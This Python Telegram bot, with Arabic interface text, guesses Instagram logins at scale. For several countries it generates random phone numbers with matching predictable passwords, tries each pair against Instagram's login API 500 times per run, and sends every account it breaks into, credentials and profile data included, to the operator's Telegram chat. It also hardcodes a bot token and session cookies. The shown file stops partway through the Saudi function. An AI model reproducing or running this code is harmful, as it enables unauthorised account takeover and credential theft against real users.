import webbrowser  
import requests
import random
import telebot
import os
from telebot import types
from uuid import uuid4
import webbrowser
import time
Z = '\033[1;31m' #احمࢪ
X = '\033[1;33m' #اصفࢪ
Z1 = '\033[2;31m' #احمࢪ ثاني
F = '\033[2;32m' #اخضࢪ
A = '\033[2;34m'#ازࢪق
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازࢪق فاتح
E = '\033[1;31m' #احمࢪ
C = "\033[1;97m" #ابيض


ToKen = "5485316158:AAHZoD2CwX0nA-XzB93k5mfhF0m2rUpKVhc"
admin=[1983379011,1468953218]
bot = telebot.TeleBot(ToKen)
@bot.message_handler(commands=['start'])
def start_message(message):
    first = message.from_user.username
    bot.send_message(message.chat.id,f"ههلا عمري @{first} ,type /check ")


    

@bot.message_handler(commands = ["check"])
def Start(message):
	 if message.from_user.id in admin:
	 	Name = message.chat.first_name
	 	User = message.from_user.username 
	 	ID = message.chat.id
	 	A = types.InlineKeyboardMarkup(row_width=1)
	 	B = types.InlineKeyboardButton(text =" المبࢪمج " , url = "t.me/s_l_3")
	 	C =  types.InlineKeyboardButton(text = "‹ بدء الشيكر 🔼  ›",callback_data="y")
	 	A.add(B,C)
	 	bot.reply_to(message, """  
		*- اهلا عزيزي ( {} )                             
		- في بوت صيد  حسابات ( Intagram )✅
		- قم بــ ضغط على ( ‹ بدء الشيكر 🔼  › ) لبدء الصيد               
		- معࢪفك : [ @{} ]                                    
		- ايديك : [ {} ]                                        *
		""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)
	 else:
			bot.reply_to(message,f'''
			حب انت ممشتࢪك 
''')
	 
	
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data =="y":
        button(call.message)
    if call.data =="Iran":
        Iran(call.message)
    if call.data =="Iraq":
         Iraq(call.message)
    if call.data =="Tr":
         TR(call.message)  
    if call.data =="EG":
    	EGYPT(call.message)
    if call.data == "Ku":
    	Kuwait(call.message)
    if call.data == "SA":
    	SAUDIA(call.message)
    if call.data == "Mo":
    	Morocco(call.message)
P  = types.InlineKeyboardButton(text = "الصيد على ايࢪان :🇮🇷", callback_data= 'Iran')
P1 = types.InlineKeyboardButton(text = "🇮🇶 : الصيد على العࢪاق", callback_data = 'iraq')
P2 = types.InlineKeyboardButton(text = "🇹🇷 : الصيد على تࢪكيا", callback_data = 'Tr')
P3 = types.InlineKeyboardButton(text = "🇪🇬: الصيد على مصࢪ", callback_data = 'EG')
P4 = types.InlineKeyboardButton(text = "🇰🇼: الصيد على الكويت", callback_data = 'Ku')
P5 = types.InlineKeyboardButton(text = "🇸🇦 :  الصيد على السعودية", callback_data = 'SA')
P6 = types.InlineKeyboardButton(text = "‹ يوزࢪات ࢪباعية :  ›",callback_data = 'Mo')
def button(message):
    O0 = types.InlineKeyboardMarkup(row_width=1)
    O0.add(P6,P,P1,P2,P3,P4,P5)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="اختاࢪ دولة تصيد عليها",parse_mode='markdown',reply_markup=O0)          
def Iran(message):	
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = "+98938"+us
		password = "0938"+us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o) 
		
def Iraq(message):	
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+964770' + us
		password = '0770' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o) 
def TR(message):	
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username =  '+90531' + us
		password = '0531' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4) 
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def EGYPT(message):
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+20112' + us
		password = '0112' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def Kuwait(message):
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(5))))
		username = '+965655' + us
		password = '655' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
			req=requests.get(url_o9, headers=head).json() 
			CaRiNo=req['graphql']['user']['id']
			name=req['graphql']['user']['full_name']
			following =req['graphql']['user']['edge_follow']['count']
			followes = req['graphql']['user']['edge_followed_by']['count']
			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
			alsh1 = alsh.json()            
			data = alsh1['data']		            	
			H+=1
			Hit = (f"""			
𝁫  HI CARINO ACCOUNT INSTAGRAM𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ اسم الحساب › : [ {name} ] 𝁫 
𝁫  ‹ اليوزࢪ › : [ {user_CaRiNo} ] 𝁫 
𝁫  ‹ المتابعون › : [ {followes} ] 𝁫  
𝁫  ‹ المتابعهم › : [ {following} ] 𝁫 
𝁫  ‹ انشاء الحساب › : [ {data} ] 𝁫 
𝁫  ‹ ࢪابط الحساب  › : [ https://instagram.com/{user_CaRiNo} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  ‹ الايميل  › : [ {username} ] 𝁫 
𝁫  ‹ الباسوࢪد › : [ {password} ] 𝁫 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _
𝁫  By : @c_p_8𝁫     
""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ ‹ المتاحات الميشتغلن › : {B} ",callback_data='CaRiNo')
		A2 = types.InlineKeyboardButton(f"✅ ‹ المتاحات اليشتغلن › : {H}",callback_data='CaRiNo1')
		A3 = types.InlineKeyboardButton(f"🔐 ‹ الحسابات البيهن سكيور › : {S}",callback_data='CaRiNo2')
		A4 = types.InlineKeyboardButton(f"‹ يوزࢪ الحساب 🔨 › : {username} Pass : {password}",callback_data='CaRiNo3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram CaRiNo *",parse_mode = "markdown",reply_markup=o)
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
def SAUDIA(message):
	S = 0
	B = 0
	H = 0
	for i in range(500):
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321') 
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+96655' + us
		password = '055' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.json():
			user_CaRiNo = req_login.json()['logged_in_user']['username']
			head = {'HOST':'www.instagram.com',  
     'KeepCaRiNove':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'ae566ed55fb7', 
     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
     'Accept-Language':'en-US,en;q=0.9'}
